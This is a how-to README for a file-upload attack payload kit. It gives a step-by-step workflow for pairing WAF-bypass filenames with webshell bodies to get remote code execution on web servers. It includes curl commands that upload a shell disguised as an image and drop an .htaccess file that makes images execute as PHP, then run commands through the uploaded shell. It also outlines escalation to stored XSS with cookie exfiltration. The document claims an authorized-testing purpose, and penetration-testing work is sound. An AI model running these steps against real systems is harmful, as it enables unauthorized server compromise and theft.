# HOW TO USE — FILE UPLOAD PAYLOAD FILES (2026)
> **Author:** MD MAHABUBUR RAHMAN
> Files: `waf-bypass-payloads.txt` (FILENAME half) + `webshell-payloads.txt` (BODY half)

## 1. The core idea
A successful upload exploit = **two halves**:
```
FILENAME  = line from waf-bypass-payloads.txt   (defeats validation/WAF on the name)
BODY      = payload block from webshell-payloads.txt   (produces the RCE/XSS)
```
You need BOTH accepted by the server and the stored file executed by the webserver.

## 2. Golden workflow (copy-paste this loop)
```
1. Find an upload point (avatar, media, doc, import, CSV, ZIP/theme).
2. Upload harmless `test.txt` -> note STORED path + URL pattern.
3. Start FILENAME ladder (first 30 lines of waf-bypass-payloads.txt):
     shell.php -> shell.phtml -> shell.php5 -> shell.pHp -> shell.php%00.png
4. For each filename that the app ACCEPTS, pair it with a BODY:
     - PHP ext     -> PHP shell  (webshell-payloads.txt #1-#4)
     - ASP/ASPX    -> ASP/ASPX   (#7-#8)
     - JSP/JSPX    -> JSP/JSPX   (#9-#10)
     - SSI ext     -> SSI        (#12)
5. Request the stored file with a harmless command and grep the BODY.
6. Any 200 + your token in the body = RCE confirmed -> stop + report.
```

## 3. Extension <-> Body pairing table
| Uploaded ext             | Use body from            |
|--------------------------|--------------------------|
| .php .php5 .phtml .phar .pht .php7 .php8 | PHP one-liner (#1)             |
| .asp .asa .cer          | ASP execute (#7)               |
| .aspx .ashx.asmx        | ASPX C# (#8)                   |
| .jsp .jspx              | JSP output-shell (#9) / JSPX (#10) |
| .shtml .shtm .stm       | SSI (#12)                      |
| .cgi .pl                | CGI/Perl (#13)                 |
| .py                     | Python CGI (#14)               |

## 4. The 3-phase escalation if nothing executes
```
PHASE A — filename blocked?
   Try null byte, trailing dot/space, case, double-ext (waf-bypass top 30).
   Or bypass with a polyglot/pure image body (webshell #17) to sneak a file in.
PHASE B — file stored but NOT executed?
   a) Webroot/config drop: upload .htaccess / .user.ini with the "AddType" 
      trick, then a .png body-shell. (filenames .htaccess/.user.ini are already
      in waf-bypass-payloads.txt)
   b) LFI next-door: if any param reads files (index.php?page=), point it at
      your uploaded image-polyglot to execute the tail computer.
   c) SSI handler enabled? -> switch body to SSI (#12).
PHASE C — nothing RCE-able?
   Pivot: SVG stored XSS (#17 polyglot) + token-cookie exfil.
   Zip-slip / XXE / IDOR on /uploads/<id> are still high-value.
```

## 5. Real command examples (authorized target)
```
# upload shell with a bypass filename (Burp Repeater or curl):
curl -F "file=@shell.phtml;type=image/png" https://target/upload

# upload the .htaccess that makes ANY extension execute as PHP:
#   (body = AddType application/x-httpd-php .png)
curl -F "file=@.htaccess" https://target/uploads/

# then upload image-with-php-tail named shell.png (webshell #17 polyglot)

# confirm execution:
curl -s "https://target/uploads/shell.png?c=id" | grep -i "uid=\|POC"
#  -> anything returned = CODE EXECUTION
```

## 6. Verification rules (avoid false positives)
- **200 alone is NOT enough.** The response must contain your echo token
  or command output (`uid=`, `POC...`), not a static fallback page.
- If the site caches/CDN serves output: use a random token each run.
- Filename rewritten to a random name = sanitizer active -> pivot.
- After confirmation, DELETE the payload file and document with a curl PoC.

## 7. Dos and don'ts
- DO start with `<?php echo "POC";?>` (webshell #21) — harmless, deletable.
- DO pair every filename attempt with correct body in one request.
- DON'T brute 500 filenames with one body; ladder by server response code.
- DON'T use destructive commands (`rm -rf`, disable server).
- ONLY test systems you are authorized to attack.

## 8. File index
| File | Contents |
|------|----------|
| `waf-bypass-payloads.txt` | 500+ FILENAME bypass payloads (extensions, null bytes, unicode, NTFS, multipart, traversal) |
| `webshell-payloads.txt` | BODY payloads: PHP/ASP/ASPX/JSP/SSI/CGI/Python/Node polyglots + token proof shell |
| `upload-bypass-payloads.txt` | Full technique matrix: MIME, magic bytes, config drops, XXE, zip-slip, post-upload checks |
| `how-to-test-2026.md` | Full manual-testing walkthrough with worked examples |

## 9. Minimum toolbelt (to run the above)
- Burp Suite (Repeater + Intruder) — filename/body ladders
- `curl` — CLI upload + execution confirm (Windows: bundled, or Git Bash/WSL)
- A text editor for crafting .htaccess/.user.ini bodies